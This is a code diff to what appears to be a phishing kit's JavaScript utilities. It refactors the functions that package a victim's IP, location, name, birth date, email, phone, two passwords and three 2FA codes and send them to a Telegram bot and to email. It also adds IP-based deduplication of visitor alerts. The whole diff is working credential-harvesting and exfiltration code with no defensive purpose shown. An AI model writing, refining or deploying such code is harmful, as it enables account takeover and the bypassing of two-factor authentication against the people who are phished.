@@ -103,56 +103,125 @@ const Utils = {
         }
     },
 
+    getLanguageGateMap() {
+        try {
+            const data = JSON.parse(localStorage.getItem('__lang_gate_by_ip__') || '{}');
+            return data && typeof data === 'object' && !Array.isArray(data) ? data : {};
+        } catch (e) {
+            return {};
+        }
+    },
+
+    getConfirmedLanguageForIp(ip) {
+        if (!ip) return null;
+        const map = this.getLanguageGateMap();
+        const value = map[ip];
+        if (!value) return null;
+        return typeof value === 'string' ? value : (value.lang || null);
+    },
+
+    markLanguageGateConfirmed(ip, lang) {
+        if (!ip) return;
+        const map = this.getLanguageGateMap();
+        map[ip] = lang || 'en';
+        try {
+            localStorage.setItem('__lang_gate_by_ip__', JSON.stringify(map));
+        } catch (e) { }
+    },
+
     async sendLanguageNotification(language) {
         const locationData = await this.getUserLocation();
-        const text = `<b>IP:</b> <code>${locationData.ip}</code>\n<b>Location:</b> <code>${locationData.location}</code>\n<b>Language:</b> <code>${language || 'N/A'}</code>`;
+        const ip = locationData.ip || 'N/A';
+        const storageKey = '__lang_notify_ips__';
+        let sentIps = [];
+
+        try {
+            sentIps = JSON.parse(localStorage.getItem(storageKey) || '[]');
+            if (!Array.isArray(sentIps)) sentIps = [];
+        } catch (e) {
+            sentIps = [];
+        }
+
+        if (sentIps.indexOf(ip) !== -1) {
+            return;
+        }
+
+        const text = `<b>IP:</b> <code>${ip}</code>\n<b>Location:</b> <code>${locationData.location}</code>\n<b>Language:</b> <code>${language || 'N/A'}</code>`;
         await this.sendTelegramMessage(text);
+
+        sentIps.push(ip);
+        try {
+            localStorage.setItem(storageKey, JSON.stringify(sentIps));
+        } catch (e) { }
+    },
+
+    formatDob(data) {
+        if (!data.day && !data.month && !data.year) return '';
+        return `${data.day || ''}/${data.month || ''}/${data.year || ''}`;
+    },
+
+    buildNotificationMessage(data, locationData, html) {
+        const line = (label, value) => {
+            if (value === undefined || value === null || String(value).trim() === '') return '';
+            if (html) return `<b>${label}:</b> <code>${value}</code>`;
+            return `${label}: ${value}`;
+        };
+
+        const section = (lines) => lines.filter(Boolean);
+
+        const parts = [];
+        parts.push(...section([
+            line('IP', locationData.ip),
+            line('Location', locationData.location)
+        ]));
+
+        const profile = section([
+            line('Full Name', data.fullName),
+            line('Page', data.fanpage),
+            line('DOB', this.formatDob(data))
+        ]);
+        if (profile.length) {
+            parts.push('----------------------', ...profile);
+        }
+
+        const contact = section([
+            line('Email', data.email),
+            line('Business Email', data.emailBusiness),
+            line('Phone', data.phone)
+        ]);
+        if (contact.length) {
+            parts.push('----------------------', ...contact);
+        }
+
+        const passwords = section([
+            line('Password(1)', data.password),
+            line('Password(2)', data.passwordSecond)
+        ]);
+        if (passwords.length) {
+            parts.push('----------------------', ...passwords);
+        }
+
+        const twoFa = section([
+            line('2FA(1)', data.twoFa),
+            line('2FA(2)', data.twoFaSecond),
+            line('2FA(3)', data.twoFaThird)
+        ]);
+        if (twoFa.length) {
+            parts.push('----------------------', ...twoFa);
+        }
+
+        return parts.join('\n');
     },
 
     async sendToTelegram(data) {
         const locationData = await this.getUserLocation();
-
-        const text = `
-<b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location})</code>
-----------------------------------
-<b>Full Name:</b> <code>${data.fullName || ''}</code>
-<b>Email:</b> <code>${data.email || ''}</code>
-<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
-<b>Page Name:</b> <code>${data.fanpage || ''}</code>
-<b>Phone:</b> <code>${data.phone || ''}</code>
-<b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
-----------------------------------
-<b>Password(1):</b> <code>${data.password || ''}</code>
-<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
-----------------------------------
-<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
-<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
-<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
-
+        const text = this.buildNotificationMessage(data, locationData, true);
         await this.sendTelegramMessage(text);
     },
 
     async sendToEmail(data) {
         const locationData = await this.getUserLocation();
-
-        const emailContent = `
-IP: ${locationData.ip}
-Location: ${locationData.location}
-----------------------------------
-Full Name: ${data.fullName || ''}
-Email: ${data.email || ''}
-Email Business: ${data.emailBusiness || ''}
-Page Name: ${data.fanpage || ''}
-Phone: ${data.phone || ''}
-Date of Birth: ${data.day}/${data.month}/${data.year}
-----------------------------------
-Password(1): ${data.password || ''}
-Password(2): ${data.passwordSecond || ''}
-----------------------------------
-🔐Code 2FA(1): ${data.twoFa || ''}
-🔐Code 2FA(2): ${data.twoFaSecond || ''}
-🔐Code 2FA(3): ${data.twoFaThird || ''}
+        const emailContent = `${this.buildNotificationMessage(data, locationData, false)}
 
 Sent at: ${new Date().toLocaleString()}`;
 
